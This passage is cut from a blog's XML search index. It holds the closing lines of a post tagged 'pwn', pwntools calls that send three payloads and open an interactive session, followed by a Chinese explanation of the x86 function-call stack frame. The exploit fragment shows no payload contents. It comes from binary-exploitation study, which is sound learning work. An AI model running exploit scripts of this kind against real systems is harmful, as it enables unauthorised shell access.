shellcodep.send(payload1)p.send(payload2)p.send(payload3)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数调用过程]]></title>
    <url>%2F2019%2F07%2F14%2Ffunc%2F</url>
    <content type="text"><![CDATA[1、调用者函数把被调函数所需要的参数按照与被调函数的形参顺序相反的顺序压入栈中,即:从右向左依次把被调函数所需要的参数压入栈; 2、调用者函数使用call指令调用被调函数,并把call指令的下一条指令的地址当成返回地址压入栈中(这个压栈操作隐含在call指令中); 3、在被调函数中,被调函数会先保存调用者函数的栈底地址(push ebp)(从高内在地址–》低内存地址),然后再保存调用者函数的栈顶地址,即:当前被调函数的栈底地址(mov ebp,esp); 4、在被调函数中,从ebp的位置处开始存放被调函数中的局部变量和临时变量,并且这些变量的地址按照定义时的顺序依次减小,即:这些变量的地址是按照栈的延伸方向排列的,先定义的变量先入栈,后定义的变量后入栈;]]></content>
      <tags>
        <tag>x86汇编</tag>
      </tags>
  </entry>
</search>
